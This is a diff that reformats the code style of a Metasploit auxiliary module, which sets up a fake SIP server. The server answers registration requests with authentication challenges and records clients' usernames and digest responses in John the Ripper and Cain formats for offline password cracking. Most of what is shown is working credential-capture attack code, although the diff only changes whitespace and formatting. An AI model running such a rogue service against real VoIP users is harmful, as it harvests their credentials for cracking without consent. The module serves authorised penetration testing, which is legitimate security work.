@@ -10,38 +10,40 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Authentication Capture: SIP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: SIP',
+      'Description' => %q{
         This module provides a fake SIP service that is designed to
         capture authentication credentials. It captures	challenge and
         response pairs that can be supplied to Cain or JtR for cracking.
       },
-      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [[ 'Capture', 'Description' => 'Run SIP capture server' ]],
+      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
+      'License' => MSF_LICENSE,
+      'Actions' => [[ 'Capture', 'Description' => 'Run SIP capture server' ]],
       'PassiveActions' => [ 'Capture' ],
-      'DefaultAction'  => 'Capture'
+      'DefaultAction' => 'Capture'
     )
 
     register_options(
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5060 ]),
-        OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
+        OptAddress.new('SRVHOST', [ true, "The local host to listen on.", '0.0.0.0' ]),
         OptString.new('NONCE', [ true, "The server byte nonce", "1234" ]),
-        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
-        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
-      ])
+        OptString.new('JOHNPWFILE', [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
+        OptString.new('CAINPWFILE', [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+      ]
+    )
     register_advanced_options(
       [
         OptString.new("SRVVERSION", [ true, "The server version to report in the greeting response", "ser (3.3.0-pre1 (i386/linux))" ]),
         OptString.new('REALM', [false, "The SIP realm to which clients authenticate", nil ]),
-      ])
+      ]
+    )
   end
 
   def sip_parse_authorization(data)
     kvps = {}
     kvps['scheme'] = data.slice!(0, data.index(' '))
-    data.split(/,\s?/).each do | item |
+    data.split(/,\s?/).each do |item|
       tokens = item.scan(/^\s?([^=]*)=\"?(.*?)\"?$/)[0]
       kvps[tokens[0]] = tokens[1]
     end
@@ -56,13 +58,13 @@ class MetasploitModule < Msf::Auxiliary
       :method => nil,
       :protocol => nil
     }
-    status = data.slice!(0, data.index(/\r?\n/)+1).split(/\s/)
+    status = data.slice!(0, data.index(/\r?\n/) + 1).split(/\s/)
     response[:method] = status[0]
     response[:uri] = status[1]
     response[:protocol] = status[2]
 
     while data.index(/\r?\n/)
-      header = (data.slice!(0, data.index(/\r?\n/)+1)).chomp
+      header = (data.slice!(0, data.index(/\r?\n/) + 1)).chomp
       response[:headers_raw] << header
       key, val = header.split(/:\s*/, 2)
       response[:headers][key] = val
@@ -73,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
   def sip_send_error_message(request, code, msg)
     ip = @requestor[:ip]
     port = @requestor[:port]
-    tag = (0...8).map{65.+(rand(25)).chr}.join
+    tag = (0...8).map { 65.+(rand(25)).chr }.join
     nonce = datastore['NONCE']
     realm = datastore['REALM'] ? datastore['REALM'] : sip_sanitize_address(ip)
     auth = []
@@ -96,9 +98,10 @@ class MetasploitModule < Msf::Auxiliary
 
   # removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR
   def sip_sanitize_address(addr)
-    if ( addr =~ /:/ )
+    if (addr =~ /:/)
       return addr.scan(/.*:(.*)/)[0][0]
     end
+
     return addr
   end
 
@@ -132,9 +135,10 @@ class MetasploitModule < Msf::Auxiliary
     begin
       @port = datastore['SRVPORT'].to_i
       @sock = Rex::Socket::Udp.create(
-            'LocalHost' => datastore['SRVHOST'],
-            'LocalPort' => @port,
-            'Context'   => {'Msf' => framework, 'MsfExploit' => self} )
+        'LocalHost' => datastore['SRVHOST'],
+        'LocalPort' => @port,
+        'Context' => { 'Msf' => framework, 'MsfExploit' => self }
+      )
       @run = true
       server_ip = sip_sanitize_address(datastore['SRVHOST'])
 
@@ -146,21 +150,22 @@ class MetasploitModule < Msf::Auxiliary
         }
         client_ip = sip_sanitize_address(res[1])
         next if not res[0] or res[0].empty?
+
         request = sip_parse_request(res[0])
         method = request[:method]
 
         case method
         when "REGISTER"
-          authorization = ( request[:headers]['Authorization'] ? request[:headers]['Authorization'] : request[:headers]['Proxy-Authorization'] )
+          authorization = (request[:headers]['Authorization'] ? request[:headers]['Authorization'] : request[:headers]['Proxy-Authorization'])
           if authorization
-            if ( request[:uri] =~ /^sip:.*?:\d+/ )
+            if (request[:uri] =~ /^sip:.*?:\d+/)
               # current versions of the JtR plugin will fail cracking SIP uri:s containing a port; eg. sip:1.2.3.4:5060
               print_status("URI with port detected in authorization SIP request, JtR may fail to crack the response")
             end
 
             auth_tokens = sip_parse_authorization(authorization)
-            response = ( auth_tokens['response'] ? auth_tokens['response'] : "" )
-            algorithm= ( auth_tokens['algorithm'] ? auth_tokens['algorithm'] : "MD5" )
+            response = (auth_tokens['response'] ? auth_tokens['response'] : "")
+            algorithm = (auth_tokens['algorithm'] ? auth_tokens['algorithm'] : "MD5")
             username = auth_tokens['username']
             proof = "client: #{client_ip}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}"
             print_good("SIP LOGIN: #{proof}")
@@ -185,13 +190,13 @@ class MetasploitModule < Msf::Auxiliary
               resp << "sip"
               resp << request[:uri].scan(/^.*?:(.*)$/)
               resp << auth_tokens['nonce']
-              resp << ( auth_tokens['cnonce'] ? auth_tokens['cnonce'] : "" )
-              resp << ( auth_tokens['nc'] ? auth_tokens['nc'] : "" )
-              resp << ( auth_tokens['qop'] ? auth_tokens['qop'] : "" )
+              resp << (auth_tokens['cnonce'] ? auth_tokens['cnonce'] : "")
+              resp << (auth_tokens['nc'] ? auth_tokens['nc'] : "")
+              resp << (auth_tokens['qop'] ? auth_tokens['qop'] : "")
               resp << algorithm
               resp << response
 
-              fd = File.open(datastore['JOHNPWFILE'] + '_sip' , "ab")
+              fd = File.open(datastore['JOHNPWFILE'] + '_sip', "ab")
               fd.puts(username + ":" + resp.join("*"))
               fd.close
             end
@@ -223,7 +228,6 @@ class MetasploitModule < Msf::Auxiliary
           sip_send_error_message(request, 401, "Unauthorized")
         end
       end
-
     rescue ::Interrupt
       raise $!
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
